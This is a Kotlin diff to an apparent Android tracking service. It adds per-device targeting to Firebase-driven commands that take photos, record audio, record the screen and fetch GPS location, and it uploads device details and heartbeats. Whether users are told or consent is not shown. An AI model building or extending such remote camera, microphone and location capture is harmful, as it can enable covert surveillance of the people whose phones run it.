@@ -38,6 +38,7 @@ import android.util.Log
 import android.util.Size
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
+import android.provider.Settings
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationCallback
 import com.google.android.gms.location.LocationRequest
@@ -76,6 +77,16 @@ class TrackerService : Service() {
     private val heartbeatHandler = Handler(Looper.getMainLooper())
     private var currentDeviceId: String = "hokim"
 
+    private val uniqueDeviceId: String by lazy {
+        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: Build.ID
+    }
+    private var currentTargetDeviceId: String? = null
+
+    private fun isCommandForThisDevice(): Boolean {
+        val target = currentTargetDeviceId
+        return target.isNullOrBlank() || target == "all" || target == uniqueDeviceId
+    }
+
     private val heartbeatRunnable = object : Runnable {
         override fun run() {
             try {
@@ -83,6 +94,7 @@ class TrackerService : Service() {
                 val devId = getActiveDeviceId()
                 val now = System.currentTimeMillis()
                 database?.getReference("tracking/devices/$devId/heartbeat")?.setValue(now)
+                database?.getReference("tracking/devices/$devId/devices/$uniqueDeviceId/lastSeen")?.setValue(now)
                 checkGpsAndBatteryStatus(devId)
             } catch (_: Exception) {}
             heartbeatHandler.postDelayed(this, 15000L)
@@ -147,6 +159,20 @@ class TrackerService : Service() {
     private fun updateDeviceInfo(devId: String) {
         val prefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
         val userJson = prefs.getString("current_user", null)
+        val manufacturer = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
+        val devName = "$manufacturer ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"
+
+        // Alohida sub-device sifatida saqlash (bir nechta qurilmadan kirilganda)
+        val subDevData = mapOf(
+            "id" to uniqueDeviceId,
+            "name" to devName,
+            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
+            "androidVersion" to Build.VERSION.RELEASE,
+            "type" to "android",
+            "lastSeen" to System.currentTimeMillis()
+        )
+        database?.getReference("tracking/devices/$devId/devices/$uniqueDeviceId")?.setValue(subDevData)
+
         if (!userJson.isNullOrEmpty()) {
             try {
                 val u = Gson().fromJson(userJson, User::class.java)
@@ -180,6 +206,7 @@ class TrackerService : Service() {
             if (level >= 0 && scale > 0) {
                 val batteryPct = (level * 100) / scale
                 database?.getReference("tracking/devices/$devId/info/battery")?.setValue(batteryPct)
+                database?.getReference("tracking/devices/$devId/devices/$uniqueDeviceId/battery")?.setValue(batteryPct)
             }
         } catch (_: Exception) {}
     }
@@ -360,8 +387,16 @@ class TrackerService : Service() {
         val cmd = commandsRef ?: return
         areCommandsListenersAttached = true
 
+        cmd.child("target_device_id").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                currentTargetDeviceId = snapshot.getValue(String::class.java)
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
+
         cmd.child("take_photo").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
+                if (!isCommandForThisDevice()) return
                 val timestamp = snapshot.getValue(Long::class.java) ?: 0L
                 if (timestamp > 0L && timestamp != lastHandledPhotoTimestamp) {
                     lastHandledPhotoTimestamp = timestamp
@@ -373,6 +408,7 @@ class TrackerService : Service() {
 
         commandsRef?.child("record_audio")?.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
+                if (!isCommandForThisDevice()) return
                 val value = snapshot.value
                 val shouldRecord = when (value) {
                     is Boolean -> value
@@ -391,6 +427,7 @@ class TrackerService : Service() {
 
         commandsRef?.child("record_screen")?.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
+                if (!isCommandForThisDevice()) return
                 val value = snapshot.value
                 val shouldRecord = when (value) {
                     is Boolean -> value
@@ -405,6 +442,7 @@ class TrackerService : Service() {
 
         commandsRef?.child("request_gps")?.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
+                if (!isCommandForThisDevice()) return
                 val ts = snapshot.getValue(Long::class.java) ?: 0L
                 if (ts > 0L) {
                     requestImmediateLocation()
